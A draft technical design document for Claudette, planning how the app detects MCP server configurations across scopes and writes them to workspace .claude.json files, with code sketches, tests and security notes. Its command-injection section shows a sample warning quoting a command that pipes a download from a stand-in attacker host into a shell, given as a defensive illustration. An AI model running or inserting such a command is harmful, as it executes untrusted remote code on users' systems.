# Technical Design: MCP Configuration Detection and Workspace Integration

**Status**: Draft
**Date**: 2026-04-13
**Issue**: [#170](https://github.com/utensils/Claudette/issues/170)
**Author**: Claude Code

## Problem Statement

When creating a new workspace in Claudette, users have no visibility into which MCP (Model Context Protocol) servers are available or configured. Users need to:

1. See all MCP servers that are configured (globally and per-project)
2. Add MCP configurations to workspace-specific `.claude.json` files
3. Enable different MCP setups for different workspaces within the same repository

Currently, Claudette only reads `.claudette.json` for custom instructions and setup scripts. There is no UI for managing `.claude.json` (Claude Code's configuration file) or MCP servers.

## User Stories

### US1: View Available MCP Servers During Workspace Creation
**As a** Claudette user creating a new workspace
**I want to** see a list of all configured MCP servers from my global and project-level Claude configurations
**So that** I know which MCP tools will be available to the Claude agent in this workspace

**Acceptance Criteria:**
- [ ] During workspace creation flow, display a list of detected MCP servers
- [ ] Show server name, type (stdio/http/sse), and scope (user/project/local)
- [ ] Indicate which servers will be active by default (based on Claude Code's precedence rules)
- [ ] Allow continuing without selecting any MCPs (skip/dismiss)

### US2: Add MCP Configuration to New Workspace
**As a** Claudette user
**I want to** select which MCP servers should be configured for a specific workspace
**So that** I can have different MCP setups for different workspaces in the same repository

**Acceptance Criteria:**
- [ ] Provide a UI to select from detected MCP servers during workspace creation
- [ ] Write selected MCP configs to `.claude.json` in the workspace's worktree root
- [ ] Support both copying existing MCP configs and creating new workspace-specific overrides
- [ ] Validate that the written `.claude.json` is well-formed JSON

### US3: Manage MCP Configuration for Existing Workspace
**As a** Claudette user with an existing workspace
**I want to** view and modify the MCP configuration for that workspace
**So that** I can adjust which MCP servers are available without recreating the workspace

**Acceptance Criteria:**
- [ ] Provide a workspace settings UI to view current MCP configuration
- [ ] Allow adding/removing MCP servers from workspace's `.claude.json`
- [ ] Show both workspace-specific and inherited (global/project) MCP servers
- [ ] Support editing MCP server configurations (args, env vars, URLs)

## Background Research

### Claude Code MCP Configuration

Claude Code uses a **three-level scoping system** for MCP configurations:

| Scope | Location | Visibility | Precedence |
|-------|----------|-----------|------------|
| **User** | `~/.claude.json` (global) | All projects | 3 (lowest) |
| **Project** | `.mcp.json` (project root) | Shared via git | 2 |
| **Local** | `.claude.json` (project root) | Current project only | 1 (highest) |

**Precedence order** (highest to lowest):
1. Local scope (`.claude.json` in project)
2. Project scope (`.mcp.json` in project)
3. User scope (`~/.claude.json` global)
4. Plugin servers
5. Claude.ai connectors

**Configuration Format**:
```json
{
  "mcpServers": {
    "server-name": {
      "type": "stdio|http|sse",
      "command": "...",
      "args": [],
      "env": {},
      "url": "https://...",
      "headers": {},
      "oauth": {}
    }
  }
}
```

**Discovery Commands**:
```bash
claude mcp list              # Show all configured servers
claude mcp get <name>        # Details for specific server
```

### Current Claudette Implementation

**Workspace Model** (`src/model/workspace.rs`):
- No workspace-specific Claude settings stored in database
- Only stores: id, repository_id, name, branch_name, worktree_path, status, session_id, turn_count

**Configuration Handling** (`src/config.rs`):
- Only reads `.claudette.json` (Claudette's config file)
- Structure: `{ "scripts": { "setup": "..." }, "instructions": "..." }`
- Located in repository root (not workspace-specific)

**Agent Spawning** (`src/agent.rs:run_turn`):
- Working directory set to workspace's worktree path
- Claude CLI reads `.claude.json` from working directory automatically
- Custom instructions passed via `--append-system-prompt` (first turn only)

**Gap**: No UI for managing `.claude.json` files or detecting MCP configurations.

## Requirements

### Functional Requirements

#### FR1: MCP Detection
- **FR1.1**: Detect MCP servers from `~/.claude.json` (user scope)
- **FR1.2**: Detect MCP servers from repository root `.mcp.json` (project scope)
- **FR1.3**: Detect MCP servers from repository root `.claude.json` (local scope)
- **FR1.4**: Parse and validate MCP server configurations
- **FR1.5**: Handle missing or malformed configuration files gracefully

#### FR2: MCP Display
- **FR2.1**: Show detected MCP servers during workspace creation
- **FR2.2**: Display server name, type, and scope for each server
- **FR2.3**: Indicate which servers will be active (based on precedence)
- **FR2.4**: Support dismissing/skipping MCP selection

#### FR3: Workspace `.claude.json` Management
- **FR3.1**: Create `.claude.json` in workspace worktree root when user selects MCPs
- **FR3.2**: Write selected MCP configurations to `mcpServers` section
- **FR3.3**: Preserve existing `.claude.json` content (merge, don't overwrite)
- **FR3.4**: Validate JSON syntax before writing
- **FR3.5**: Support editing workspace `.claude.json` after creation

#### FR4: MCP Server Configuration
- **FR4.1**: Support all three MCP transport types (stdio, http, sse)
- **FR4.2**: Handle environment variable expansion syntax (`${VAR}`, `${VAR:-default}`)
- **FR4.3**: Display environment variables with masking for sensitive values
- **FR4.4**: Allow copying MCP config from one scope to another

### Non-Functional Requirements

#### NFR1: Performance
- **NFR1.1**: MCP detection should complete in < 200ms for typical configs (< 20 servers)
- **NFR1.2**: UI should remain responsive during MCP detection

#### NFR2: Security
- **NFR2.1**: Mask sensitive values in UI (API keys, tokens, secrets)
- **NFR2.2**: Validate file paths to prevent directory traversal
- **NFR2.3**: Sanitize JSON to prevent injection attacks

#### NFR3: Compatibility
- **NFR3.1**: Support Claude Code's configuration format exactly (no custom extensions)
- **NFR3.2**: Written `.claude.json` files must be readable by Claude Code CLI
- **NFR3.3**: Handle both legacy and current MCP configuration formats

#### NFR4: Usability
- **NFR4.1**: MCP selection should be optional (can skip)
- **NFR4.2**: Provide clear error messages for configuration issues
- **NFR4.3**: Show examples or help text for MCP configuration

## Architecture

### Design Principles

1. **Minimal Claudette-Specific Logic**: Delegate MCP discovery to Claude CLI when possible
2. **Read-Only for Global Configs**: Never modify `~/.claude.json` or `.mcp.json` (respect user's global settings)
3. **Workspace Isolation**: Each workspace can have its own `.claude.json` in its worktree
4. **No Database Storage**: MCP configurations live in `.claude.json` files, not in SQLite (follows existing pattern)
5. **TOCTOU Prevention**: Pass resolved MCP server configs directly from frontend to backend to avoid re-detection race conditions

### Data Flow

```
┌─────────────────┐
│ User Creates    │
│ New Workspace   │
└────────┬────────┘
         │
         ▼
┌─────────────────────────┐
│ Detect MCP Servers      │
│ - ~/.claude.json        │
│ - repo/.mcp.json        │
│ - repo/.claude.json     │
└────────┬────────────────┘
         │
         ▼
┌─────────────────────────┐
│ Display MCP Selection   │
│ Modal (Optional)        │
└────────┬────────────────┘
         │
         ▼
    ┌────┴──────┐
    │ User      │
    │ Choice    │
    └────┬──────┘
         │
    ┌────┴──────────┐
    │               │
    ▼               ▼
 Skip MCP      Select MCPs
    │               │
    └───────┬───────┘
            │
            ▼
   ┌────────────────┐
   │ Create Workspace│
   │ (existing flow) │
   └────────┬────────┘
            │
            ▼
   ┌──────────────────┐
   │ If MCPs selected,│
   │ write .claude.json│
   │ to worktree root  │
   └──────────────────┘
```

### Component Design

#### Backend Components

##### 1. MCP Detection Module (`src/mcp.rs`)

**Purpose**: Parse and detect MCP configurations from various sources.

```rust
/// Represents a detected MCP server configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpServer {
    pub name: String,
    pub config: McpServerConfig,
    pub scope: McpScope,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "lowercase")]
pub enum McpServerConfig {
    Stdio {
        command: String,
        args: Vec<String>,
        env: HashMap<String, String>,
    },
    Http {
        url: String,
        headers: HashMap<String, String>,
        oauth: Option<OAuthConfig>,
    },
    Sse {
        url: String,
    },
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum McpScope {
    User,     // ~/.claude.json (global)
    Project,  // .mcp.json (project root)
    Local,    // .claude.json (worktree root, workspace-local config)
}

/// Main detection function
pub async fn detect_mcp_servers(
    repo_path: &Path
) -> Result<Vec<McpServer>, String> {
    // 1. Read ~/.claude.json
    // 2. Read {repo_path}/.mcp.json
    // 3. Read {repo_path}/.claude.json
    // 4. Parse and merge (with precedence tracking)
}

/// Parse a single .claude.json or .mcp.json file
fn parse_mcp_config(
    path: &Path,
    scope: McpScope
) -> Result<Vec<McpServer>, String> {
    // Parse JSON, extract mcpServers section
}

/// Write MCP servers to workspace .claude.json
pub async fn write_workspace_mcp_config(
    worktree_path: &Path,
    servers: &[McpServer]
) -> Result<(), String> {
    // 1. Read existing .claude.json (if exists)
    // 2. Merge/update mcpServers section
    // 3. Write back with pretty formatting
}
```

**Error Handling**:
- Missing files are not errors (return empty list)
- Malformed JSON returns descriptive error
- Invalid server configs are skipped with warning

##### 2. Tauri Commands (`src-tauri/src/commands/mcp.rs`)

```rust
/// Detect all MCP servers for a repository
#[tauri::command]
pub async fn detect_mcp_servers(
    repo_id: String,
    state: State<'_, AppState>,
) -> Result<Vec<McpServer>, String> {
    // 1. Get repository path from database
    // 2. Call mcp::detect_mcp_servers
}

/// Write MCP configuration to workspace .claude.json
#[tauri::command]
pub async fn configure_workspace_mcps(
    workspace_id: String,
    servers: Vec<McpServer>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    // 1. Get workspace worktree path from database
    // 2. Call mcp::write_workspace_mcp_config with the already-resolved servers
    // Note: Accepts Vec<McpServer> directly to avoid TOCTOU risk from re-detection
}

/// Read workspace .claude.json MCP configuration
#[tauri::command]
pub async fn read_workspace_mcps(
    workspace_id: String,
    state: State<'_, AppState>,
) -> Result<Vec<McpServer>, String> {
    // 1. Get workspace worktree path
    // 2. Parse .claude.json in worktree
    // 3. Return MCP servers
}
```

#### Frontend Components

##### 1. MCP Selection Modal (`src/ui/src/components/modals/McpSelectionModal.tsx`)

**Purpose**: Display detected MCP servers and allow selection during workspace creation.

**Props**:
```typescript
interface McpSelectionModalProps {
  isOpen: boolean;
  onClose: () => void;
  repoId: string;
  workspaceId: string; // Modal opens after workspace creation succeeds
  onConfirm: (selectedServerNames: string[]) => Promise<void>;
}
```

**UI Layout**:
```
┌────────────────────────────────────────┐
│ Configure MCP Servers for Workspace   │
├────────────────────────────────────────┤
│                                        │
│ Select which MCP servers to enable:   │
│                                        │
│ ☐ filesystem (stdio, user)            │
│   Command: npx -y @modelcontextpro...  │
│                                        │
│ ☑ github (http, project)              │
│   URL: https://mcp.github.com/api      │
│                                        │
│ ☐ postgres (stdio, local)             │
│   Command: docker exec postgres-mcp... │
│                                        │
│ [Skip]  [Configure Selected Servers]  │
└────────────────────────────────────────┘
```

**Behavior**:
- Opens after the workspace has been created, so `workspaceId` is available for any config writes
- Calls `detect_mcp_servers(repoId)` on mount
- Displays loading state while detecting
- Shows error if detection fails
- Allows multiple selection (checkboxes)
- "Skip" button closes modal without writing config
- "Configure Selected Servers" button calls `configure_workspace_mcps(workspaceId, selectedServers)` then `onConfirm()`
- No pre-create write mode: detection can inform creation UX, but `.claude.json` is only written after workspace creation succeeds

##### 2. Workspace Settings MCP Tab (Future Enhancement)

**Purpose**: Manage MCP configuration for existing workspace.

**Location**: New tab in workspace settings modal (not yet implemented).

**Features**:
- Display current workspace MCP servers
- Show inherited servers (from user/project scope) with "read-only" indicator
- Add/remove servers from workspace config
- Edit server configurations (args, env vars)

### Alternative Approaches Considered

#### Alternative 1: Shell Out to `claude mcp list`

**Approach**: Use `claude mcp list --output-format json` to detect MCP servers.

**Pros**:
- Leverages Claude CLI's existing detection logic
- Guaranteed to match Claude Code's behavior
- Handles all edge cases (plugin servers, OAuth, env var expansion)

**Cons**:
- Requires Claude CLI to be installed and in PATH
- Slower (subprocess overhead)
- JSON format may not include scope information
- Requires parsing CLI output format (not stable API)

**Decision**: **Rejected** for initial implementation. Parsing config files directly is faster and more reliable. We can add CLI-based detection as a fallback or validation step later.

#### Alternative 2: Store MCP Configs in Database

**Approach**: Copy MCP configurations into Claudette's SQLite database.

**Pros**:
- Faster querying (no file I/O on every workspace creation)
- Can track MCP usage statistics per workspace
- Offline-first (no need to read files)

**Cons**:
- Duplicates data (source of truth is `.claude.json` files)
- Requires sync mechanism when files change externally
- Database migrations needed for schema changes
- Violates "config in files, not database" principle

**Decision**: **Rejected**. Claudette already follows the pattern of reading `.claudette.json` on-demand. MCP configs should follow the same pattern. The database is for runtime state (workspaces, sessions), not configuration.

#### Alternative 3: Read-Only MCP Display (No Workspace Config)

**Approach**: Only show detected MCPs during workspace creation (informational), but don't write `.claude.json`.

**Pros**:
- Simpler implementation (no file writing)
- No risk of corrupting `.claude.json` files
- Fewer edge cases (merge conflicts, formatting)

**Cons**:
- Doesn't solve user's problem (can't customize MCP setup per workspace)
- Limited value (user can already run `claude mcp list` manually)
- Misses opportunity for workflow improvement

**Decision**: **Rejected**. The core value proposition is enabling workspace-specific MCP configurations. Read-only display alone is insufficient.

## Implementation Plan

### Phase 1: Core MCP Detection (P0)

**Goal**: Detect and display MCP servers during workspace creation.

**Tasks**:
1. Create `src/mcp.rs` module with:
   - `McpServer`, `McpServerConfig`, `McpScope` types
   - `detect_mcp_servers()` function
   - `parse_mcp_config()` helper
   - Unit tests for parsing various config formats
2. Add Tauri command `detect_mcp_servers` in `src-tauri/src/commands/mcp.rs`
3. Create `McpSelectionModal.tsx` component with:
   - MCP server list display
   - Loading/error states
   - Skip/Cancel functionality (no configuration yet)
4. Integrate modal into workspace creation flow in `Sidebar.tsx`
5. Add frontend service function in `src/ui/src/services/mcp.ts`

**Acceptance Criteria**:
- [ ] MCP detection works for all three scopes (user, project, local)
- [ ] Modal displays server name, type, and scope
- [ ] Handles missing/malformed config files gracefully
- [ ] Unit tests pass for various config formats
- [ ] UI shows loading state during detection

**Estimated Complexity**: Medium

### Phase 2: Workspace MCP Configuration (P0)

**Goal**: Write selected MCP configs to workspace `.claude.json`.

**Tasks**:
1. Implement `write_workspace_mcp_config()` in `src/mcp.rs`:
   - Read existing `.claude.json` (if present)
   - Merge `mcpServers` section
   - Write formatted JSON
   - Handle file I/O errors
2. Add Tauri command `configure_workspace_mcps`
3. Update `McpSelectionModal.tsx`:
   - Add checkbox selection UI
   - Wire up "Configure Selected Servers" button
   - Show success/error toasts
4. Test end-to-end flow:
   - Create workspace
   - Select MCP servers
   - Verify `.claude.json` written correctly
   - Verify Claude agent can read config

**Acceptance Criteria**:
- [ ] Selected MCP configs written to worktree `.claude.json`
- [ ] Existing `.claude.json` content preserved (merge, not overwrite)
- [ ] JSON validation prevents malformed files
- [ ] UI shows clear error messages on failure
- [ ] Claude CLI can read written `.claude.json` (`claude mcp list` shows servers)

**Estimated Complexity**: Medium

### Phase 3: MCP Management UI (P1)

**Goal**: View/edit MCP configuration for existing workspace.

**Tasks**:
1. Create workspace settings modal (if doesn't exist) or add MCP tab
2. Add `read_workspace_mcps` Tauri command
3. Display workspace-specific MCP servers
4. Show inherited servers (read-only)
5. Implement add/remove MCP server functionality
6. Add "Test MCP Server" button (validates connectivity)

**Acceptance Criteria**:
- [ ] User can view all MCP servers for a workspace (workspace + inherited)
- [ ] User can add/remove MCP servers from workspace config
- [ ] Changes persist to `.claude.json` immediately
- [ ] UI indicates which servers are inherited vs. workspace-specific

**Estimated Complexity**: High (depends on workspace settings modal implementation)

### Phase 4: Advanced Features (P2)

**Goal**: Polish and advanced MCP workflows.

**Tasks**:
1. Environment variable expansion in UI (show resolved values)
2. Sensitive value masking (API keys, tokens)
3. MCP server templates (common configurations)
4. Import MCP server from URL/JSON snippet
5. Export workspace MCP config for sharing
6. MCP server health check (test connection)

**Acceptance Criteria**:
- [ ] Env vars display resolved values (e.g., `$HOME` → `/home/user`)
- [ ] Sensitive values masked in UI (show `***` instead of tokens)
- [ ] Users can select from MCP server templates
- [ ] Import/export works for individual servers and full configs

**Estimated Complexity**: High

## Testing Strategy

### Unit Tests

**Backend (`src/mcp.rs`)**:
- Parse valid `.claude.json` with stdio, http, and sse servers
- Parse `.mcp.json` with project-scoped servers
- Handle missing config files (return empty list)
- Handle malformed JSON (return error)
- Handle invalid server configs (skip with warning)
- Merge configs from multiple scopes with correct precedence
- Write MCP config to new `.claude.json`
- Merge MCP config into existing `.claude.json`
- Preserve non-MCP fields in `.claude.json`

**Frontend (`McpSelectionModal.test.tsx`)**:
- Render loading state during detection
- Render MCP server list with correct data
- Handle detection errors gracefully
- Allow selecting/deselecting servers
- Disable "Configure" button when no servers selected
- Call `configure_workspace_mcps` with correct arguments

### Integration Tests

1. **End-to-End Workspace Creation**:
   - Create workspace with MCP selection
   - Verify `.claude.json` written to worktree
   - Spawn Claude agent in workspace
   - Verify agent can access MCP tools

2. **Config File Scenarios**:
   - User has global MCPs, no project MCPs
   - Project has `.mcp.json`, no user MCPs
   - Project has both `.mcp.json` and `.claude.json` (test precedence)
   - No MCP configs anywhere (empty list)

3. **Error Scenarios**:
   - Worktree directory is read-only (write fails)
   - `.claude.json` exists but is malformed (merge fails)
   - Workspace deleted during MCP configuration

### Manual Testing

**Test Cases**:
1. Install MCP server globally via `claude mcp add`, verify it appears in Claudette
2. Create `.mcp.json` in project, verify project-scoped servers appear
3. Create workspace, select MCPs, verify `.claude.json` written correctly
4. Create workspace, skip MCP selection, verify no `.claude.json` created
5. Edit `.claude.json` manually, verify changes reflected in UI
6. Delete `.claude.json` in workspace, verify inherited servers still shown

## Edge Cases and Error Handling

### Edge Case 1: Workspace Creation Fails After MCP Selection

**Scenario**: User selects MCPs, modal writes `.claude.json`, but workspace creation fails (e.g., git worktree error).

**Handling**:
- **Option A** (Recommended): Write `.claude.json` AFTER workspace creation succeeds
  - Pro: No orphaned config files
  - Con: Extra step in creation flow
- **Option B**: Write `.claude.json` before workspace creation
  - Pro: Simpler flow
  - Con: May leave orphaned `.claude.json` in worktree if creation fails

**Decision**: Option A. Write `.claude.json` only after workspace is created and persisted to database.

### Edge Case 2: `.claude.json` Exists with Non-MCP Content

**Scenario**: Workspace already has `.claude.json` with custom instructions or other settings.

**Handling**:
- Parse existing file as JSON
- Preserve all fields except `mcpServers`
- Merge/replace `mcpServers` section
- Pretty-print with 2-space indentation (match Claude CLI format)

**Example**:

Before:
```json
{
  "customInstructions": "Always use TypeScript",
  "mcpServers": {
    "old-server": { "type": "stdio", "command": "old" }
  }
}
```

After (user selects "new-server", removes "old-server"):
```json
{
  "customInstructions": "Always use TypeScript",
  "mcpServers": {
    "new-server": { "type": "http", "url": "https://..." }
  }
}
```

### Edge Case 3: MCP Server with Environment Variables

**Scenario**: MCP config includes `${API_KEY}` in env/headers, but variable is not set.

**Handling**:
- Display raw variable syntax in UI (e.g., `${API_KEY}`)
- Optionally show resolved value if variable is set (e.g., `${API_KEY}` → `sk-abc***`)
- When writing to `.claude.json`, preserve variable syntax (don't resolve)
- Claude CLI will resolve at runtime

**UI**:
```
Server: github-api
Type: http
URL: https://api.github.com/mcp
Headers:
  Authorization: Bearer ${GITHUB_TOKEN}  [resolved: ghp_abc***]
```

### Edge Case 4: Conflicting MCP Server Names Across Scopes

**Scenario**: User has `filesystem` server in `~/.claude.json`, and project has different `filesystem` server in `.mcp.json`.

**Handling**:
- Show both servers in UI with scope indicator:
  ```
  ☐ filesystem (stdio, user)
  ☐ filesystem (http, project)  ← higher precedence
  ```
- When user selects project-scoped server, write it to workspace `.claude.json` (overrides user-scoped)
- Clarify precedence in UI tooltip: "This server will override the user-scoped server with the same name"

### Edge Case 5: Permission Errors Writing `.claude.json`

**Scenario**: Worktree directory is read-only or user lacks write permissions.

**Handling**:
- Catch file I/O error in `write_workspace_mcp_config()`
- Return descriptive error: "Failed to write .claude.json: Permission denied"
- Display error toast in UI
- Log full error to console/logs for debugging
- Allow user to retry or skip

## Security Considerations

### S1: Sensitive Data Exposure

**Risk**: MCP configs may contain API keys, tokens, or credentials in `env`, `headers`, or `oauth` fields.

**Mitigation**:
- Mask sensitive values in UI (show `***` after first 3 characters)
- Do not log MCP configs to console or files
- Warn users before writing sensitive values to workspace `.claude.json` (shared via git)
- Recommend using environment variables instead of hardcoded secrets

**Example**:
```
env:
  API_KEY: sk-ant-api03-abc***  (masked)
  DATABASE_URL: postgres://user:pass***@localhost/db
```

### S2: JSON Injection

**Risk**: Maliciously crafted `.claude.json` or `.mcp.json` could exploit JSON parser vulnerabilities.

**Mitigation**:
- Use battle-tested JSON parser (`serde_json` in Rust)
- Validate the expected MCP schema, especially the shape of `mcpServers` and nested server definitions
- For `.claude.json`, allow and preserve unknown/non-MCP root-level fields (for example `customInstructions`); only reject invalid or unexpected structure within the MCP-specific sections being read or written
- Sanitize error messages (don't include file content in user-facing errors)

### S3: Path Traversal

**Risk**: Attacker could craft `worktree_path` to write `.claude.json` outside workspace directory.

**Mitigation**:
- Validate `worktree_path` is a subdirectory of repository root
- Use `canonicalize()` to resolve symlinks and `..` components
- Reject paths outside repository boundary
- Log security violations for monitoring

**Example**:
```rust
let canonical_worktree = worktree_path.canonicalize()
    .map_err(|_| "Invalid worktree path")?;
let canonical_repo = repo_path.canonicalize()
    .map_err(|_| "Invalid repository path")?;

if !canonical_worktree.starts_with(&canonical_repo) {
    return Err("Worktree path is outside repository".to_string());
}
```

### S4: Command Injection (Stdio MCP Servers)

**Risk**: Stdio MCP configs include `command` and `args` that could be exploited if user copies untrusted configs.

**Mitigation**:
- Display warning when copying stdio servers from untrusted sources
- Show full command in UI before writing to `.claude.json`
- Do not execute MCP commands in Claudette (only Claude CLI does)
- Recommend reviewing configs before selecting

**UI Warning**:
```
⚠ This MCP server runs a command on your system:
  Command: bash -c "curl http://evil.com | sh"

Only add MCP servers from trusted sources.
[Cancel] [I Understand, Add Server]
```

## Open Questions

### Q1: Should we validate MCP server connectivity?

**Question**: When user selects an MCP server, should we test if it's reachable/functional before writing to `.claude.json`?

**Pros**:
- Prevents broken configs
- Better UX (immediate feedback)

**Cons**:
- Adds latency to workspace creation
- Stdio servers may fail without proper working directory/env
- HTTP servers may require authentication

**Recommendation**: Add as optional feature in Phase 4 ("Test MCP Server" button in settings UI). Don't block workspace creation on validation.

### Q2: Should we parse `.claude.json` for non-MCP settings?

**Question**: `.claude.json` can contain other settings like `customInstructions`, `allowedTools`, etc. Should we display/manage these in Claudette?

**Scope Creep Risk**: High. This expands the feature significantly.

**Recommendation**: Phase 1-2 should only handle `mcpServers` section. Preserve other fields but don't display/edit them. Future enhancement can add full `.claude.json` editor.

### Q3: How to handle MCP server name conflicts?

**Question**: If user selects MCP server with same name as existing workspace server, should we:
1. Overwrite (replace existing)
2. Rename (append `-2`, `-3`, etc.)
3. Block (show error)

**Recommendation**: Option 1 (overwrite) with clear UI indication: "This will replace the existing 'filesystem' server in workspace config."

### Q4: Should we support `.mcp.json` writing?

**Question**: Should Claudette allow creating/editing `.mcp.json` (project-scoped) in addition to `.claude.json` (local-scoped)?

**Consideration**: `.mcp.json` is typically shared via git. Claudette would need to handle git status, conflicts, etc.

**Recommendation**: Phase 1-2 should only write to workspace-specific `.claude.json` (local scope, not shared). Project-scoped `.mcp.json` management is out of scope for initial implementation.

### Q5: What if `~/.claude.json` doesn't exist?

**Question**: Some users may not have global Claude config. Should we create it if needed?

**Recommendation**: No. Only read `~/.claude.json` if it exists. Don't create or modify user's global config. Claudette should only manage workspace-local `.claude.json` files.

## Success Metrics

### Primary Metrics

1. **Adoption Rate**: % of workspace creations that use MCP selection (target: >30%)
2. **Configuration Success Rate**: % of MCP configurations that succeed without errors (target: >95%)
3. **Time to Configure**: Median time from workspace creation to first Claude agent turn with MCPs (target: <30 seconds)

### Secondary Metrics

4. **MCP Discovery Coverage**: % of users' MCP servers detected correctly (target: 100%)
5. **Error Rate**: % of workspace creations that fail due to MCP config issues (target: <1%)
6. **Support Tickets**: Reduction in MCP-related support requests (target: -50%)

### User Satisfaction

7. **User Feedback**: Positive sentiment on MCP feature (survey after 2 weeks)
8. **Feature Usage**: % of users with >1 workspace using different MCP configs (indicates value)

## Future Enhancements

### FE1: MCP Server Marketplace

**Description**: Curated list of popular MCP servers with one-click installation.

**Features**:
- Browse MCP servers by category (databases, APIs, tools)
- Preview server capabilities (tools, resources, prompts)
- One-click add to workspace
- Community ratings and reviews

### FE2: MCP Server Health Monitoring

**Description**: Monitor MCP server availability and performance.

**Features**:
- Real-time status indicators (green/yellow/red)
- Error logs for failed MCP calls
- Performance metrics (latency, success rate)
- Alerts for server downtime

### FE3: MCP Configuration Templates

**Description**: Pre-configured MCP setups for common workflows.

**Features**:
- Templates: "Web Development", "Data Analysis", "DevOps", etc.
- Bundled MCP servers for each template
- Customizable after applying template
- Share templates with team via JSON export

### FE4: Cross-Workspace MCP Sync

**Description**: Sync MCP configuration across multiple workspaces.

**Features**:
- Mark MCP configs as "global" (apply to all workspaces in repo)
- Bulk update (apply changes to N workspaces at once)
- Conflict resolution UI
- Dry-run mode (preview changes)

## Appendix

### A1: MCP Configuration Examples

**Stdio Server (Local File System)**:
```json
{
  "mcpServers": {
    "filesystem": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/user/projects"],
      "env": {}
    }
  }
}
```

**HTTP Server (Remote API)**:
```json
{
  "mcpServers": {
    "github": {
      "type": "http",
      "url": "https://mcp.github.com/api",
      "headers": {
        "Authorization": "Bearer ${GITHUB_TOKEN}"
      }
    }
  }
}
```

**SSE Server (Legacy)**:
```json
{
  "mcpServers": {
    "legacy-sse": {
      "type": "sse",
      "url": "https://old-mcp.example.com/sse"
    }
  }
}
```

### A2: Claude Code Precedence Example

**Scenario**:
- User config (`~/.claude.json`): `filesystem` → `/home/user`
- Project config (`.mcp.json`): `filesystem` → `/project/root`
- Local config (`.claude.json`): `github` → `https://api.github.com`

**Effective Configuration**:
- `filesystem` server: Uses **project** scope → `/project/root` (local scope has highest precedence but does not define `filesystem`)
- `github` server: Uses **local** scope → `https://api.github.com` (only defined here)

### A3: References

- Claude Code MCP Documentation: https://code.claude.com/docs/en/mcp.md
- MCP Specification: https://modelcontextprotocol.io/
- Claudette Architecture: `CLAUDE.md`, Issue #5, Issue #11
- Relevant Claudette Files:
  - `src/config.rs` (existing `.claudette.json` handling)
  - `src/agent.rs` (agent spawning with working directory)
  - `src-tauri/src/commands/workspace.rs` (workspace creation flow)
  - `src/ui/src/components/modals/ConfirmSetupScriptModal.tsx` (similar modal UI)

---

**Next Steps**:
1. Review this TDD with stakeholders
2. Validate architecture and scope
3. Prioritize phases (confirm P0/P1/P2)
4. Assign implementation to sprint
5. Create detailed GitHub issues for each phase
